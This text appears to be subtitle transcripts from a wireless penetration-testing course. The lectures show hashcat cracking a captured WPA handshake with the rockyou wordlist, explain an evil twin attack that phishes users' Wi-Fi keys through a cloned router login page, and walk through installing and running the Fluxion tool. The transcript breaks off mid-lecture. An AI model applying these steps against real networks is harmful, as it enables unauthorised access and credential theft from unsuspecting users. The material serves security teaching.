Now, the first option or argument that I want to use is the minus capital I.

46
00:03:27,070 --> 00:03:33,340
And in the description you can see that this argument will show us information about the devices in

47
00:03:33,340 --> 00:03:36,250
this computer that can be used for cracking.

48
00:03:37,250 --> 00:03:40,040
So if we just do minus I.

49
00:03:41,480 --> 00:03:45,590
You can see that we have two devices that we can use for cracking.

50
00:03:45,830 --> 00:03:51,860
We have my device number one, which is the GPU, and it has an ID of one.

51
00:03:51,860 --> 00:03:58,010
And you can see all the information about this device in here, including its memory.

52
00:03:58,900 --> 00:04:03,970
Then we can see we have another device and that is a CPU.

53
00:04:04,000 --> 00:04:05,290
It's not a GPU.

54
00:04:05,380 --> 00:04:10,030
And again, you can see all the information related to this device.

55
00:04:12,170 --> 00:04:15,770
Now, the next option that I want to use is the minus M.

56
00:04:17,260 --> 00:04:22,360
Now this specifies the hash type, so the type of hash that you want to crack.

57
00:04:23,480 --> 00:04:29,570
Now the hash type is a number, so we have to give a number that corresponds to the hash that we want

58
00:04:29,570 --> 00:04:30,350
to crack.

59
00:04:30,650 --> 00:04:32,630
And if we scroll down.

60
00:04:34,310 --> 00:04:40,910
You'll see that we have a table called hash Modes, and it contains all the hashes that we can crack

61
00:04:40,910 --> 00:04:43,040
and their corresponding number.

62
00:04:43,730 --> 00:04:53,330
So my target is a WPA hash or WPA two, and you can see that the number corresponding to this is 2500.

63
00:04:53,970 --> 00:05:01,620
So to set this option, we're going to do minus M and we're going to put 2500 to tell Hashcat that I

64
00:05:01,620 --> 00:05:05,070
want to crack a WPA or WPA to hash.

65
00:05:07,180 --> 00:05:11,170
Now, the next option that I want to set is the minus D.

66
00:05:12,340 --> 00:05:16,450
To tell Hashcat which device I want to use for cracking.

67
00:05:16,480 --> 00:05:19,870
So when we did minus I, we seen we had two devices.

68
00:05:19,870 --> 00:05:25,570
We had number one, which was my GPU and we had number two, which was my CPU.

69
00:05:26,410 --> 00:05:32,980
So I want to use the GPU for cracking and therefore I'm going to do minus D one.

70
00:05:34,900 --> 00:05:40,990
Now let's go up and have another look on the usage of the tool to make sure that we're using it properly.

71
00:05:41,350 --> 00:05:43,000
So we've already set hashcat.

72
00:05:43,030 --> 00:05:49,690
We've already set the options and the next thing that we need to do is to give the cap X file followed

73
00:05:49,690 --> 00:05:51,580
by the wordlist file.

74
00:05:51,850 --> 00:06:00,850
So we've already converted our handshake to the cap X extension and we placed it with the wordlist both

75
00:06:00,850 --> 00:06:03,070
in the same directory as Hashcat.

76
00:06:03,070 --> 00:06:05,410
So that's our current working directory.

77
00:06:06,730 --> 00:06:09,520
As you can see here, I have my word list.

78
00:06:10,950 --> 00:06:15,000
And I have my cap file right here.

79
00:06:18,410 --> 00:06:20,510
So my handshake is called handshake.

80
00:06:20,810 --> 00:06:22,000
Hcpcs.

81
00:06:23,390 --> 00:06:26,990
And my word list is called rockyou dot txt.

82
00:06:29,820 --> 00:06:31,890
So now our command is done.

83
00:06:31,890 --> 00:06:36,420
And let me go over it just one more time so that it's clear to you.

84
00:06:36,960 --> 00:06:43,710
First of all, we put the tool name, which is Hashcat, and we put 64 because I have a 64 bit processor.

85
00:06:43,710 --> 00:06:53,790
So we're doing Hashcat 64 dot x, we're doing dash M to specify the hash type and I'm putting 2500 because

86
00:06:53,790 --> 00:07:01,950
we went on the hash modes table and we seen that 2500 is the number for WPA and Wpa2 hashes.

87
00:07:02,430 --> 00:07:10,050
Then I did Dash D and I put number one to tell Hashcat that I want to use device number one for cracking.

88
00:07:10,080 --> 00:07:17,220
That's my GPU and I was able to see all my devices by doing Hashcat dash I.

89
00:07:17,250 --> 00:07:23,100
So we did that at the start and we seen the list and then we seen that device number one corresponds

90
00:07:23,100 --> 00:07:24,360
to my GPU.

91
00:07:25,500 --> 00:07:31,080
Then, according to the usage of the tool, we see that we have to specify the handshake file after

92
00:07:31,080 --> 00:07:31,590
that.

93
00:07:31,590 --> 00:07:38,610
And I've already converted my handshake file to a CapEx extension and it's already in the same working

94
00:07:38,610 --> 00:07:39,180
directory.

95
00:07:39,180 --> 00:07:44,690
That's why I don't need to give a full path and it's called handshake CapEx.

96
00:07:44,700 --> 00:07:51,090
And finally, we have to we have to give the word list and again, the word list in the same working

97
00:07:51,090 --> 00:07:56,490
directory so I don't have to give a full path and we just have to say Rockyou dot txt, which is the

98
00:07:56,490 --> 00:07:57,870
name of my word list.

99
00:07:59,100 --> 00:08:00,510
Now I'm going to hit Enter.

100
00:08:01,650 --> 00:08:08,190
And Hashcat is going to start the cracking process using my GPU instead of the CPU.

101
00:08:11,170 --> 00:08:16,240
Now, as you can see, we can actually pause and resume using the P and R if we want.

102
00:08:16,240 --> 00:08:22,420
And this way we'll be able to save our progress so that we can stop and come back to the cracking whenever

103
00:08:22,420 --> 00:08:23,140
we want.

104
00:08:25,800 --> 00:08:26,370
Okay.

105
00:08:26,370 --> 00:08:32,310
Now, as you can see, Hashcat is done and it managed to get the password for me.

106
00:08:32,430 --> 00:08:36,090
And this is the network name, so that's the name of my network.

107
00:08:36,090 --> 00:08:40,890
And you can see that I managed to get me the password, which is one, two, three, four, A, B,

108
00:08:40,890 --> 00:08:41,400
C, d.

109
00:08:43,660 --> 00:08:49,480
It took it one minute and seven seconds to get to this password, and I've actually moved the password

110
00:08:49,480 --> 00:08:55,780
manually to the end of the word list to make sure that we go through the whole word list in this lecture.

111
00:08:56,890 --> 00:08:59,890
Now, let me show you how big the word list is.

112
00:08:59,890 --> 00:09:01,380
It's actually not a small word list.

113
00:09:01,390 --> 00:09:03,910
It's not a huge word list, but it's big enough.

114
00:09:03,910 --> 00:09:09,160
So one minute and seven seconds, it's a really, really good time to go through this word list.

115
00:09:09,550 --> 00:09:16,300
So I'm just going to open it right here and I'm going to scroll all the way down.

116
00:09:18,740 --> 00:09:26,270
And as you can see, we managed to go through about 14 million passwords within one minute, seven seconds.

117
00:09:26,300 --> 00:09:30,410
Now, my password is actually at the bottom, but it's not the very last password.

118
00:09:30,410 --> 00:09:32,090
So it's around the 14 million.

119
00:09:32,090 --> 00:09:38,370
But this is a very impressive time compared to the time that you'd get with the CPU.

120
00:09:38,390 --> 00:09:42,740
Again, 14 million passwords within one minute, seven seconds.

121
00:09:43,520 --> 00:09:50,390
Now I'm not using the best GPU in the market, so if you have a better GPU, then you'll be even faster

122
00:09:50,390 --> 00:09:51,200
than this.

123
00:09:51,200 --> 00:09:54,710
But even with that, it's a very, very good time.

124
00:09:55,490 --> 00:10:02,420
So as you can see, using the GPU will make the cracking process much, much faster than what it would

125
00:10:02,420 --> 00:10:04,290
be if we were using a CPU.

126
00:10:04,310 --> 00:10:06,740
Even if your CPU is very fast.

127
00:10:06,860 --> 00:10:14,420
Now, just as an idea or for something for you to try as practice, you can actually pipe crunch to

128
00:10:14,420 --> 00:10:21,380
hashcat exactly the same way that I showed you how to do it with Aircrack so you can practice that yourself.

129
00:10:21,380 --> 00:10:27,550
And Hashcat already supports pause and resume so you'll be able to use huge word lists.

130
00:10:27,560 --> 00:10:33,200
You'll be able to save your progress and you'll also be using your GPU for the cracking so you'll be

131
00:10:33,230 --> 00:10:38,480
able to go through the word list much faster than what you would if you're using aircrack ng.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 7: Gaining Access - WPA & WPA2 Cracking - Evil Twin Attack


1
00:00:01,190 --> 00:00:08,840
Now, like I said before, when we fail to gain our access to the target using the software and the

2
00:00:08,840 --> 00:00:16,640
hardware used on that system, the last resort that we can target is the users that use that system.

3
00:00:16,640 --> 00:00:21,200
So we'll try to social engineer them so that they'll give us what we want.

4
00:00:22,190 --> 00:00:28,400
Now, I've actually discussed this idea when we were talking about the captive portals and how to bypass

5
00:00:28,400 --> 00:00:33,950
them, and I said the last resort is to use social engineering and get the users to literally give you

6
00:00:33,950 --> 00:00:34,820
the password.

7
00:00:35,150 --> 00:00:38,240
So this is exactly the same idea.

8
00:00:38,390 --> 00:00:42,340
So this is a very popular attack called an evil twin attack.

9
00:00:42,350 --> 00:00:49,490
And in my opinion, it should be left as the last resort when trying to gain access to WPA and WPA two

10
00:00:49,490 --> 00:00:50,200
networks.

11
00:00:50,210 --> 00:00:55,220
So we're assuming that you tried everything, you tried the Wordlist attacks and you tried to exploit

12
00:00:55,220 --> 00:00:57,980
the WPA feature and everything failed.

13
00:00:57,980 --> 00:01:01,400
Then the last option is to use this method.

14
00:01:02,000 --> 00:01:08,030
Now the idea is very similar to the idea when we were talking about bypassing captive portals.

15
00:01:08,710 --> 00:01:14,890
So basically we'd want to start a fake access point with the same name as the target network.

16
00:01:14,890 --> 00:01:19,900
So when we're talking about captive portals, we said it's okay to call it a similar name or to call

17
00:01:19,900 --> 00:01:25,990
it version two, but in this case, we have to call it the same name because we're targeting a normal

18
00:01:25,990 --> 00:01:27,670
network, not a captive portal.

19
00:01:27,670 --> 00:01:31,900
And the user will only connect to a network that they know this is their network.

20
00:01:31,900 --> 00:01:34,420
So it has to be called the same name.

21
00:01:35,140 --> 00:01:40,660
The second step is going to be disconnecting all the clients, then wait for them to connect to our

22
00:01:40,660 --> 00:01:46,150
fake network because all of their attempts to connect to the proper network will fail because we're

23
00:01:46,150 --> 00:01:48,490
running our authentication attack.

24
00:01:49,030 --> 00:01:55,630
And finally, when they connect, we'll automatically display a page asking for their network key for

25
00:01:55,960 --> 00:01:57,880
for their WPA key.

26
00:01:58,880 --> 00:02:04,850
Now, looking at this scenario here, we can see that the advantage is we're not going to have to use

27
00:02:04,850 --> 00:02:05,900
a word list attack.

28
00:02:05,900 --> 00:02:08,510
There will be no guessing in this situation.

29
00:02:08,510 --> 00:02:14,750
So even if the password is very difficult, if it if it's a long password with digits and characters

30
00:02:14,750 --> 00:02:20,390
and special characters will still be able to get it because the user will type it for us.

31
00:02:21,390 --> 00:02:24,250
Now the drawbacks or the disadvantages?

32
00:02:24,270 --> 00:02:31,380
First, the user will have to connect to an open network so they know that their network uses WPA or

33
00:02:31,380 --> 00:02:32,670
WPA two.

34
00:02:32,670 --> 00:02:39,360
But in this scenario, once we disconnect them from their network, they'll have to connect to an open

35
00:02:39,360 --> 00:02:40,200
network.

36
00:02:40,210 --> 00:02:42,840
So this might make the user suspicious.

37
00:02:42,840 --> 00:02:45,510
They might know that something wrong is happening.

38
00:02:46,230 --> 00:02:54,090
The second problem is they have to enter the WPA key in a web page because like we see in the page that

39
00:02:54,090 --> 00:02:57,060
asks them for a password is a normal web page.

40
00:02:57,480 --> 00:03:03,360
Now, this could be less of a problem if your target is logging in through their phone or through OSX,

41
00:03:03,360 --> 00:03:07,770
because these systems will show the web page inside a window.

42
00:03:07,770 --> 00:03:14,070
So it'll actually look as if it's being displayed by a certain program and it won't look like it's being

43
00:03:14,070 --> 00:03:15,570
displayed in a web page.

44
00:03:15,570 --> 00:03:20,980
But in Windows and Linux, the web page will be displayed inside the normal web browser.

45
00:03:20,980 --> 00:03:23,110
So this will be a bit suspicious.

46
00:03:23,680 --> 00:03:29,110
Now, when we were doing it with the captive portal, I said it's not suspicious at all because first

47
00:03:29,110 --> 00:03:32,470
of all, captive portals are open by default.

48
00:03:32,500 --> 00:03:38,170
The users are used to connect to a number of access points because they usually cover a large area.

49
00:03:38,170 --> 00:03:41,140
So if they see two access points, they won't get suspicious.

50
00:03:41,230 --> 00:03:47,620
And finally, captive portals ask for their password through a web page, through a normal login by

51
00:03:47,620 --> 00:03:48,580
default again.

52
00:03:48,580 --> 00:03:55,390
So everything that we do in the captive portal scenario is what users do in a normal, proper captive

53
00:03:55,390 --> 00:03:56,050
portal.

54
00:03:56,080 --> 00:03:58,120
Whereas in here we have two problems.

55
00:03:58,120 --> 00:04:03,340
The first problem is the users have to connect to an open network even though they know their network

56
00:04:03,340 --> 00:04:04,870
is not an open network.

57
00:04:05,320 --> 00:04:09,040
Secondly, they'll have to enter their password in a web page.

58
00:04:09,500 --> 00:04:15,080
Now, with that being said, the success rate of this method is actually pretty high, and you'll be

59
00:04:15,080 --> 00:04:18,170
surprised about the number of people that will be fooled by it.

60
00:04:18,170 --> 00:04:23,360
But I just wanted to set your expectations so, you know, how is this going to work?

61
00:04:24,540 --> 00:04:30,720
Now executing this attack is going to be identical to the way that we executed it when we were doing

62
00:04:30,720 --> 00:04:32,370
it with the captive portal.

63
00:04:32,370 --> 00:04:38,730
So you'll have to first have a fake login page, place it in your web server, clean the IP tables and

64
00:04:38,730 --> 00:04:39,480
all of that.

65
00:04:39,480 --> 00:04:43,860
Start the fake access point, start DNS mask and you're good to go.

66
00:04:44,460 --> 00:04:47,670
The only difference here is with the captive portal.

67
00:04:47,670 --> 00:04:51,270
We cloned the login page used by the captive portal.

68
00:04:51,300 --> 00:04:58,320
By default, when you're targeting a WPA or a WPA two network, we know that these networks don't ask

69
00:04:58,320 --> 00:05:02,040
their users to log in, so there is nothing that we can clone.

70
00:05:02,190 --> 00:05:08,040
Therefore, you're going to have to design a login page yourself or download the ready template and

71
00:05:08,040 --> 00:05:12,720
there is a lot of them online and I might share some of some links with you in the resources of this

72
00:05:12,720 --> 00:05:13,500
lecture.

73
00:05:13,740 --> 00:05:17,040
Or you can do what I'm going to show you right now.

74
00:05:17,070 --> 00:05:23,970
You can just go to the login page of your router and preferably you want to go to a login page of a

75
00:05:23,970 --> 00:05:30,430
router that has the same model as the target router and you can find that from the name of the router.

76
00:05:31,120 --> 00:05:35,710
Now first of all, we want to find out what's the IP of my router.

77
00:05:35,710 --> 00:05:37,750
So we're going to do route N.

78
00:05:40,500 --> 00:05:42,870
And that'll show me the IP of my router.

79
00:05:42,870 --> 00:05:46,830
We can see it's 1921681254.

80
00:05:48,030 --> 00:05:58,530
So if I go here and go to 1921681254, you'll see I see the settings page, the login for the settings

81
00:05:58,530 --> 00:05:59,820
page of the router.

82
00:06:00,680 --> 00:06:01,550
Now this page.

83
00:06:01,550 --> 00:06:07,940
You'll be perfect to be used to ask the user to enter their WPA key because we can see we have the logo

84
00:06:07,940 --> 00:06:10,820
for the network for the Internet provider.

85
00:06:10,820 --> 00:06:15,500
We have two text boxes asking for a username and a password and we have a login button.

86
00:06:15,500 --> 00:06:17,000
So everything is perfect.

87
00:06:17,830 --> 00:06:22,750
Now you can download this login page like I showed you before, modify it.

88
00:06:22,750 --> 00:06:24,580
So make sure that you add the form.

89
00:06:24,580 --> 00:06:28,180
Make sure you delete the username because there is no need for a username.

90
00:06:28,190 --> 00:06:35,110
Instead of the login, you can modify this text and ask the user to enter their WPA key and add a submit

91
00:06:35,110 --> 00:06:35,770
button.

92
00:06:36,460 --> 00:06:41,110
Now I've covered all of this in a full lecture before, so I'm not going to repeat it.

93
00:06:41,110 --> 00:06:45,340
This is just a different page, but the process is going to be identical.

94
00:06:45,850 --> 00:06:53,470
So basically all the steps in here are identical to the steps that we've done before except for generating

95
00:06:53,470 --> 00:06:54,430
the login page.

96
00:06:54,430 --> 00:06:57,580
And like I said, there is three ways for getting the login page.

97
00:06:57,580 --> 00:07:05,050
You can design one yourself, you can look for templates online or you can use the router settings page

98
00:07:05,050 --> 00:07:08,920
and adapt it to ask the user to enter their WPA key.

99
00:07:10,000 --> 00:07:15,910
Everything else is going to be identical to what I covered before, and that's why in the next lecture

100
00:07:15,910 --> 00:07:21,020
I'm actually going to show you how to run an evil twin attack using a different method.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,500 --> 00:00:07,880
Now, like I said, you can generate a fake access point and run an evil to an attack against a WPA

2
00:00:07,880 --> 00:00:16,010
or a WPA two networks using the exact same steps that I showed when I was targeting a captive portal.

3
00:00:16,550 --> 00:00:23,210
The only difference is there is no login page to clone, so you'll either have to design one yourself

4
00:00:23,210 --> 00:00:30,920
or you can download one online, or you can use the router login page and modify it to ask for the WPA

5
00:00:30,920 --> 00:00:31,820
two key.

6
00:00:32,510 --> 00:00:39,440
Now I also spent a full lecture before on downloading and modifying HTML pages so you can use the exact

7
00:00:39,440 --> 00:00:41,030
same method to do that.

8
00:00:41,720 --> 00:00:47,840
Therefore, because the steps are identical, I don't want to run the exact same attack again in this

9
00:00:47,840 --> 00:00:51,140
lecture because I'm just going to be repeating myself.

10
00:00:51,680 --> 00:00:58,190
While I want to show you instead is how to do this whole evil twin attack automatically without having

11
00:00:58,190 --> 00:01:00,060
to do all the steps manually.

12
00:01:00,750 --> 00:01:04,250
To do that, we're going to use a tool called Fluxion.

13
00:01:04,260 --> 00:01:10,140
And Fluxion will basically follow the exact same steps that I showed you, but it'll just do everything

14
00:01:10,140 --> 00:01:11,190
automatically.

15
00:01:11,700 --> 00:01:15,510
So first it'll create a fake access point for us.

16
00:01:15,690 --> 00:01:17,890
It will start a web server.

17
00:01:17,910 --> 00:01:23,850
It has a number of templates so you can pick whatever template you want to use to display to the target

18
00:01:23,850 --> 00:01:26,130
person for them to enter their password.

19
00:01:26,700 --> 00:01:30,510
It will automatically disconnect all clients from their network.

20
00:01:30,900 --> 00:01:37,380
It will display the login page that we picked here to the clients whenever they connect to our fake

21
00:01:37,410 --> 00:01:38,550
access point.

22
00:01:38,880 --> 00:01:46,800
And finally, it will go one more step and it's going to check whether the password entered by the user

23
00:01:46,800 --> 00:01:48,390
is correct or not.

24
00:01:49,050 --> 00:01:51,990
So it'll basically do everything that we've done before.

25
00:01:51,990 --> 00:01:57,480
Automatically it's going to create the fake access point, it's going to start the Dhcp server, it's

26
00:01:57,480 --> 00:02:03,240
going to start the DNS server, it's going to create the fake login page, it'll put it in the web server,

27
00:02:03,240 --> 00:02:10,080
it'll configure the web server properly so it supports Https, it'll add the redirect rules and it'll

28
00:02:10,110 --> 00:02:14,910
basically give you everything that I showed you before, but it's going to do it automatically.

29
00:02:15,600 --> 00:02:19,890
So you might think, Why did I spend so many lectures and go into so much details?

30
00:02:19,890 --> 00:02:23,040
If there is a tool that will do everything for us automatically?

31
00:02:23,640 --> 00:02:28,080
Well, the reason is I don't want you to be, first of all, dependent on these tools.

32
00:02:28,080 --> 00:02:33,450
I want you to have an understanding of exactly how an access point works.

33
00:02:33,450 --> 00:02:40,380
What are the components used inside access points, and how do these components work together to create

34
00:02:40,380 --> 00:02:41,940
an evil access point?

35
00:02:42,390 --> 00:02:48,790
Also, I broke each one of these steps individually so that it's as generic as possible so that you

36
00:02:48,790 --> 00:02:52,810
can use it to adapt it to any scenario that you might face.

37
00:02:52,810 --> 00:02:58,090
So maybe in the future you might want to use a fake access point for a different reason.

38
00:02:58,090 --> 00:03:00,040
Therefore, you can't use this tool.

39
00:03:00,040 --> 00:03:01,540
You'll have to do it manually.

40
00:03:01,780 --> 00:03:08,230
And a perfect example for this is this tool will not allow you to target captive portals, so you can

41
00:03:08,230 --> 00:03:11,680
only use it to target WPA and Wpa2 networks.

42
00:03:11,680 --> 00:03:16,900
And in the previous lectures I showed you how to do this attack against captive portals, which you

43
00:03:16,900 --> 00:03:18,970
won't be able to use this tool for.

44
00:03:19,970 --> 00:03:24,640
Another reason is you really need to understand how all of this happen in the background.

45
00:03:24,650 --> 00:03:29,010
You can't just come in, download the tool and use it and say that you're a hacker.

46
00:03:29,030 --> 00:03:29,630
Fine.

47
00:03:29,630 --> 00:03:34,910
If you want to save time and use it as long as you understand how this works, so that if things fail

48
00:03:34,910 --> 00:03:40,880
or if you want to do your own scenario or adapt this to your own situation, then you'll be able to

49
00:03:40,880 --> 00:03:43,130
leave the tool and do it manually.

50
00:03:43,790 --> 00:03:47,600
So first of all, let me show you how to download and install the tool.

51
00:03:49,280 --> 00:03:56,060
Now this is a GitHub repo, which is a website where programmers can share their code, contribute and

52
00:03:56,060 --> 00:03:58,190
allow people to contribute to it.

53
00:03:58,460 --> 00:04:01,940
So what we want to do right now is just download the source code.

54
00:04:01,940 --> 00:04:08,000
So we're just going to click on this green button which says Clone and copy this URL in here.

55
00:04:08,030 --> 00:04:14,240
Then I'm going to go to my terminal and I'm going to navigate to my opt directory.

56
00:04:15,770 --> 00:04:20,060
Now, this directory is supposed to be the place where you keep your optional programs.

57
00:04:20,060 --> 00:04:22,010
That's why I'm going to store it in here.

58
00:04:22,160 --> 00:04:26,460
And then I'm going to use a git command to download this repo.

59
00:04:26,480 --> 00:04:27,980
So we're going to do git.

60
00:04:29,070 --> 00:04:31,680
Clone to download.

61
00:04:31,680 --> 00:04:36,510
And then I'm going to put the URL for this repo that I just copied.

62
00:04:36,990 --> 00:04:44,010
So we're doing Git, that's the name of the program that interacts with git repos, which is what GitHub

63
00:04:44,010 --> 00:04:44,730
uses.

64
00:04:45,000 --> 00:04:52,950
Then I'm doing clone to tell git that I want to download and then I'm giving it the URL for the repo

65
00:04:52,980 --> 00:04:55,320
that I want to download, which is this one.

66
00:04:55,920 --> 00:04:57,330
Now I'm going to hit enter.

67
00:04:59,760 --> 00:05:04,320
And that'll just basically download all the files that are stored in here.

68
00:05:06,310 --> 00:05:08,350
Okay, now the download is complete.

69
00:05:08,380 --> 00:05:09,940
Now if I do ls.

70
00:05:10,780 --> 00:05:16,390
To list the files and directories, you'll see that I have an extra file in here or extra directory

71
00:05:16,390 --> 00:05:17,290
I should say.

72
00:05:17,290 --> 00:05:18,940
And it's called Fluxion.

73
00:05:18,940 --> 00:05:26,590
So this is the directory that we just downloaded so we can navigate inside it by doing CD fluxion.

74
00:05:28,720 --> 00:05:30,340
Now I'm going to list again.

75
00:05:32,950 --> 00:05:36,610
And as you can see, we have the executables for the tool.

76
00:05:36,760 --> 00:05:39,160
Now, I don't want to run the executables.

77
00:05:39,160 --> 00:05:45,010
I want to navigate into this directory right here that's called install because I want to install the

78
00:05:45,010 --> 00:05:45,910
tool first.

79
00:05:45,940 --> 00:05:48,040
So I'm going to do CD install.

80
00:05:48,950 --> 00:05:50,120
List again.

81
00:05:51,540 --> 00:05:56,720
And the file that I want to run is this one install dot FX.

82
00:05:57,360 --> 00:06:00,270
So to run this file, we have to do bash.

83
00:06:01,810 --> 00:06:06,440
And then followed by the file name, which is Install.sh.

84
00:06:07,270 --> 00:06:08,650
I'm going to hit Enter.

85
00:06:11,120 --> 00:06:14,300
And now the installer will check for dependencies.

86
00:06:14,300 --> 00:06:20,210
And if it discovers that I have a dependency missing, then it will automatically install it for me.

87
00:06:20,810 --> 00:06:27,110
Now I should say this is going to install flux Gentoo for me and at the time of recording this video

88
00:06:27,140 --> 00:06:29,630
flux John three is already out.

89
00:06:29,660 --> 00:06:35,880
The reason why I'm installing Flux two because first of all I noticed that it's more reliable than flux.

90
00:06:36,050 --> 00:06:36,320
Three.

91
00:06:36,350 --> 00:06:38,570
Flux three seems to be buggy.

92
00:06:38,930 --> 00:06:46,490
Also, this repo right here has so many more web templates that you can use with the fake access point.

93
00:06:46,490 --> 00:06:51,530
So that one only has one very basic template that looks unbelievable.

94
00:06:51,530 --> 00:06:55,670
But with this one, you have more options to pick from the templates.

95
00:06:55,670 --> 00:06:58,190
So that's why I'm using an older version.

96
00:06:58,190 --> 00:07:03,230
It works better than the new version and it also has more templates, so why not?

97
00:07:04,110 --> 00:07:10,350
Now the program has finished installing dependencies for me and now I'm just going to do CD dot dot

98
00:07:10,380 --> 00:07:12,000
to go back one directory.

99
00:07:13,380 --> 00:07:20,740
Then I'm just going to do list to list the files and we can run the executable now, which is fluxion

100
00:07:20,820 --> 00:07:21,740
dot H.

101
00:07:21,840 --> 00:07:23,610
So we can just do bash.

102
00:07:24,410 --> 00:07:25,600
Flexion dot.

103
00:07:27,050 --> 00:07:27,440
Hit.

104
00:07:27,440 --> 00:07:28,130
Enter.

105
00:07:29,750 --> 00:07:30,140
Now.

106
00:07:30,140 --> 00:07:30,710
That's it.

107
00:07:30,710 --> 00:07:32,570
That's how you can install the tool.

108
00:07:32,570 --> 00:07:38,690
And in the next lecture I'll show you how to use it to hack a WPA or WPA two network.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,740 --> 00:00:01,400
All right.

2
00:00:01,430 --> 00:00:08,150
Now that we have luxeon installed, let's see how we can use it to run an evil twin attack automatically

3
00:00:08,150 --> 00:00:11,390
against a WPA or a WPA two network.

4
00:00:11,780 --> 00:00:16,430
So first of all, you want to navigate to the location where you installed Fluxon.

5
00:00:16,550 --> 00:00:25,550
So in my case, it's installed in opt Fluxon So we're going to do CD opt flux on.

6
00:00:27,560 --> 00:00:29,240
I'm going to do list to list.

7
00:00:29,510 --> 00:00:35,600
And like I showed you in the previous lecture, the file that we want to run is this executable?

8
00:00:36,270 --> 00:00:37,830
So we're going to do bash.

9
00:00:39,400 --> 00:00:40,120
Flexion.

10
00:00:40,150 --> 00:00:41,320
Dot h.

11
00:00:41,860 --> 00:00:43,150
I'm going to hit Enter.

12
00:00:46,650 --> 00:00:51,900
And the first thing that it's going to do is it's asking me to select the language that I want to run

13
00:00:51,900 --> 00:00:52,980
the program with.

14
00:00:53,220 --> 00:00:55,140
Now I want to run it in English.

15
00:00:55,140 --> 00:00:59,940
So I'm going to put number one, because that's the number that corresponds to English.

16
00:01:00,210 --> 00:01:01,590
So I'm going to put one.

17
00:01:04,810 --> 00:01:10,720
And now it's asking me whether I want to look for networks on all channels or on a specific channel.

18
00:01:11,350 --> 00:01:16,930
I want to look for networks on all channels, and therefore I'm going to put again number one.

19
00:01:19,970 --> 00:01:24,620
This will automatically show an airodump ng window in here, as you can see.

20
00:01:24,710 --> 00:01:27,680
And this will list all the networks around me.

21
00:01:28,700 --> 00:01:31,670
Now I want to target this UPC network.

22
00:01:32,060 --> 00:01:38,090
So once you see the network that you want to target, just click on this window and then do control

23
00:01:38,120 --> 00:01:40,250
C to go back to Fluxion.

24
00:01:41,450 --> 00:01:47,630
Now you can see Fluxion is showing me the networks that I can target and the one that I want to target,

25
00:01:47,630 --> 00:01:50,600
like I said, is this UPC network.

26
00:01:50,690 --> 00:01:58,460
And you can see that it's using WPA two on Channel one and its ID is number three.

27
00:01:58,490 --> 00:02:03,470
So if we want to target this network, all we have to do is just put number three.

28
00:02:05,920 --> 00:02:11,650
Now it's asking me which method I want to use to generate the fake access point.

29
00:02:11,800 --> 00:02:18,670
So when I was doing this manually, remember I said Hostapd is the tool that all the tools or all the

30
00:02:18,670 --> 00:02:22,270
other scripts use to create their fake access point.

31
00:02:22,780 --> 00:02:29,080
And as you can see here, the first option will use Hostapd and the second option will use airbase,

32
00:02:29,470 --> 00:02:34,030
which I actually covered it as well in a previous lecture in my network course.

33
00:02:34,840 --> 00:02:40,330
So I'm going to go for number one to generate the fake access point using Hostapd.

34
00:02:42,520 --> 00:02:47,800
Then it's asking me to give it the location where I stored my handshake.

35
00:02:48,250 --> 00:02:55,150
The reason why it asks for the handshake because Fluxion will go for one extra step, like I said,

36
00:02:55,150 --> 00:02:59,410
and it will go and verify the password entered by the user.

37
00:02:59,410 --> 00:03:03,940
So it's going to make sure that the password is correct before it shows it to us.

38
00:03:04,060 --> 00:03:10,240
Now you can skip this by pressing enter or if you capture the handshake, like in my case, I've actually

39
00:03:10,240 --> 00:03:12,760
captured it before, I'm going to give it to it.

40
00:03:12,760 --> 00:03:18,100
So I'm going to say it's stored in root and it's called Handshake zero one cap.

41
00:03:18,610 --> 00:03:23,620
Now, I've actually covered capturing the handshake before in a full lecture, so I'm not going to cover

42
00:03:23,620 --> 00:03:24,340
it right now.

43
00:03:24,340 --> 00:03:27,490
And I'm just going to give the file where the handshake is stored.

44
00:03:27,790 --> 00:03:33,760
Now, we can also just not type anything and hit enter and it will automatically capture the handshake

45
00:03:33,760 --> 00:03:34,360
for you.

46
00:03:34,360 --> 00:03:38,980
But since I've captured it, I've gave it its path and I'm just going to hit enter.

47
00:03:42,190 --> 00:03:45,910
Now it's telling me the handshake is corrupt, but it's not.

48
00:03:45,910 --> 00:03:52,980
So it's also asking me if I want to try aircrack ng instead of pirate to verify the handshake.

49
00:03:52,990 --> 00:03:55,390
So I'm going to say yes, please do that.

50
00:03:58,130 --> 00:04:00,180
And that's going ahead now.

51
00:04:00,200 --> 00:04:06,740
Now, the next step is it's asking me to create an SSL certificate or search for one.

52
00:04:06,920 --> 00:04:10,280
So I'm going to go with number one to create the certificate.

53
00:04:11,490 --> 00:04:16,710
Now, as you can see now it's actually going through similar steps to the ones that we went through

54
00:04:16,740 --> 00:04:17,460
manually.

55
00:04:17,490 --> 00:04:23,610
We just had to do all these commands individually, configure our web server individually and all that.

56
00:04:24,610 --> 00:04:29,170
Now it's asking me what I want to do right now for the attack.

57
00:04:29,200 --> 00:04:33,040
If I want to select a web interface, that's the only option that I have.

58
00:04:33,070 --> 00:04:34,540
So I'm going with number one.

59
00:04:36,740 --> 00:04:41,660
And now it's actually given me a number of interfaces that I can use.

60
00:04:41,660 --> 00:04:47,480
So this is the interface or the web page that will be displayed to the target once they connect to our

61
00:04:47,480 --> 00:04:48,260
network.

62
00:04:49,070 --> 00:04:51,770
So first of all, it has generic interfaces.

63
00:04:51,770 --> 00:04:58,190
So it has a generic English one, a generic Arabic one, a generic French one, and so on.

64
00:04:58,670 --> 00:05:04,550
If you scroll down, you'll also see that there are interfaces based on the router.

65
00:05:04,550 --> 00:05:12,310
So we have a Belkin one and Netgear one, a Virgin Media one, a Tp-link one, and so on.

66
00:05:12,320 --> 00:05:19,880
So if you know your target, for example, uses a tp-link router, then you can just go for 33 and let's

67
00:05:19,880 --> 00:05:20,780
go for that.

68
00:05:24,820 --> 00:05:28,750
And now this is automatically going to start the fake access point for me.

69
00:05:28,780 --> 00:05:33,400
It's going to start a Dhcp server at the NFS server.

70
00:05:33,430 --> 00:05:35,310
It's going to start a web server.

71
00:05:35,320 --> 00:05:43,420
Put the interface that I picked in that web server and configure it to support Https and configure the

72
00:05:43,420 --> 00:05:48,400
URL, redirect rules properly so that everything works as expected.

73
00:05:48,430 --> 00:05:52,090
So it's literally doing all the steps that I showed you before.

74
